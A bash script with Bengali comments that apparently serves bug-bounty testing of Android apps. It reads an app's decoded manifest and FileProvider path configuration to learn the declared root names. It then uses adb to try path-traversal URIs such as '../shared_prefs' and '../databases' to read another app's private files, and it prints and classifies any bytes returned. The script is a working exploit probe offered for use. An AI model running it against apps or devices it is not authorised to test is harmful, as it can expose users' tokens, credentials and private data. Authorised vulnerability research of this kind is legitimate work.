#!/usr/bin/env bash
# mvrp-fileprovider.sh — FileProvider-এর পথ-নকশা পড়ো, তারপর বৈধ root দিয়ে probe করো।
#
# কেন দরকার:
#   কাঁচা traversal (`/../../data/data/...`) FileProvider-এ কাজ করে না, কারণ
#   প্রথম path segment-টা একটা *নাম* — file_paths.xml-এ ঘোষিত root-এর নাম।
#   নাম না মিললে provider ভেতরে crash করে:
#     NullPointerException: ... String.contains(...) on a null object reference
#   ওই crash-টা "আটকে দিয়েছে" না — ওটা "আমাদের ইনপুট নিয়ে চলেছে, কিন্তু root চেনেনি"।
#   তাই আসল কাজ: ঘোষিত root-এর নাম জেনে নিয়ে সেগুলো দিয়ে traversal করা।
#
# ব্যবহার:  ./mvrp-fileprovider.sh com.google.android.apps.safetyhub
set -uo pipefail

PKG="${1:?ব্যবহার: $0 <package>}"
OUT="${MVRP_OUT:-$HOME/mvrp}"
DEC="$OUT/decoded/$PKG"; RES="$DEC/resources"; EV="$OUT/evidence/$PKG"
M="$RES/AndroidManifest.xml"
mkdir -p "$EV"
LOG="$EV/fileprovider-$(date +%Y%m%d-%H%M).txt"

[ -f "$M" ] || { echo "!! manifest নেই: $M"; exit 1; }
command -v adb >/dev/null || { echo "!! adb নেই"; exit 1; }

classify() {
  local o="$1"
  if   grep -qiE 'permission denial|securityexception' <<<"$o"; then echo DENIED
  elif grep -qiE 'unknown uri|failed to find provider|could not find provider' <<<"$o"; then echo NOPROVIDER
  elif grep -qi 'error while accessing provider' <<<"$o"; then echo REACHED
  elif [ -z "${o//[[:space:]]/}" ]; then echo SILENT
  else echo BYTES
  fi
}
rd() { adb shell content read --uri "$1" 2>&1 | tr -d '\r' | head -12; }

{
echo "# FileProvider path-config probe"
echo "# package : $PKG"
echo "# when    : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "# device  : $(adb shell getprop ro.product.model | tr -d '\r') / Android $(adb shell getprop ro.build.version.release | tr -d '\r')"
echo "# caller  : adb shell, uid=$(adb shell id -u | tr -d '\r')"
echo

# ---- CONTROL ----
echo "== CONTROL =="
SEN=$(rd "content://$PKG.canary.not.real/x/y")
echo "SENTINEL content://$PKG.canary.not.real/x/y -> $(classify "$SEN")"
if [ "$(classify "$SEN")" = "BYTES" ]; then
  echo "!! CONTROL FAIL: অস্তিত্বহীন authority বাইট ফেরত দিয়েছে। থামো।"; exit 3
fi
echo

# ---- manifest থেকে FileProvider + তার path-config resource ----
python3 -I - "$M" <<'PY' > "$EV/.fp"
import sys, xml.etree.ElementTree as ET
AND="http://schemas.android.com/apk/res/android"
def a(e,n,d=None): return e.get("{%s}%s"%(AND,n),d)
r=ET.parse(sys.argv[1]).getroot(); app=r.find("application")
n=0
for p in app.findall("provider"):
    if a(p,"enabled")=="false": continue
    exported = a(p,"exported")=="true" or (a(p,"exported") is None and p.findall("intent-filter"))
    if not exported: continue
    auth=a(p,"authorities") or ""
    perm=a(p,"permission") or a(p,"readPermission") or ""
    res=""
    for md in p.findall("meta-data"):
        if "FILE_PROVIDER_PATHS" in (a(md,"name") or ""):
            res=(a(md,"resource") or "").replace("@xml/","")
    for one in auth.split(";"):
        if one:
            print(f"{one}|{res}|{perm}|{a(p,'name')}")
            n+=1
import sys as s
print(f"#COUNT {n}", file=s.stderr)
PY

COUNT=$(wc -l < "$EV/.fp")
echo "== manifest-এ $COUNT exported provider =="
if [ "$COUNT" -eq 0 ]; then
  echo "!! CONTROL FAIL: একটাও exported provider পার্স হয়নি। manifest ঠিক আছে তো?"; exit 3
fi
echo

while IFS='|' read -r auth res perm cls; do
  [ -z "$auth" ] && continue
  echo "---------------------------------------------------------------"
  echo "authority : $auth"
  echo "class     : $cls"
  echo "permission: ${perm:-NONE}"

  ROOTS=()
  if [ -n "$res" ] && [ -f "$RES/res/xml/$res.xml" ]; then
    echo "paths cfg : res/xml/$res.xml"
    sed 's/^/            /' "$RES/res/xml/$res.xml" | head -30
    mapfile -t ROOTS < <(grep -o 'name="[^"]*"' "$RES/res/xml/$res.xml" | sed 's/name="//;s/"$//' | sort -u)
  else
    echo "paths cfg : (নেই — FileProvider নয়, অথবা resource পাওয়া যায়নি)"
  fi

  if [ ${#ROOTS[@]} -eq 0 ]; then
    echo "  -> ঘোষিত root নেই, probe বাদ"
    echo
    continue
  fi

  echo "  ঘোষিত root: ${ROOTS[*]}"
  for root in "${ROOTS[@]}"; do
    for suffix in "" "../shared_prefs" "../../shared_prefs" "../databases" "../../databases"; do
      uri="content://$auth/$root${suffix:+/$suffix}"
      o=$(rd "$uri"); v=$(classify "$o")
      case "$v" in
        BYTES)
          echo "  BYTES   $uri"
          echo "          ----- ফেরত আসা বাইট -----"
          sed 's/^/          /' <<<"$o"
          echo "          -------------------------";;
        DENIED) echo "  DENIED  $uri";;
        *) : ;;   # REACHED / NOPROVIDER / SILENT — কোলাহল, চুপ থাকো
      esac
    done
  done
  echo
done < "$EV/.fp"

cat <<'NOTE'
== পড়ার নিয়ম ==
BYTES    একটা unprivileged caller অন্য app-এর ফাইলের বাইট পড়েছে।
         এখনই প্রশ্ন: ভেতরে কী? token/credential/medical/message হলে finding।
         শুধু config/ফাঁকা/আবর্জনা হলে kill list — "access to non-sensitive
         internal files of another app also does not qualify".
DENIED   সীমানা ধরে আছে।
REACHED  provider চলেছে কিন্তু path চেনেনি। root-এর নাম বা suffix বদলাও।
         jadx-এ ওই provider-এর UriMatcher/getFile দেখলে সঠিক রূপ জানা যাবে।
NOTE
} 2>&1 | tee "$LOG"

echo
echo "evidence: $LOG"
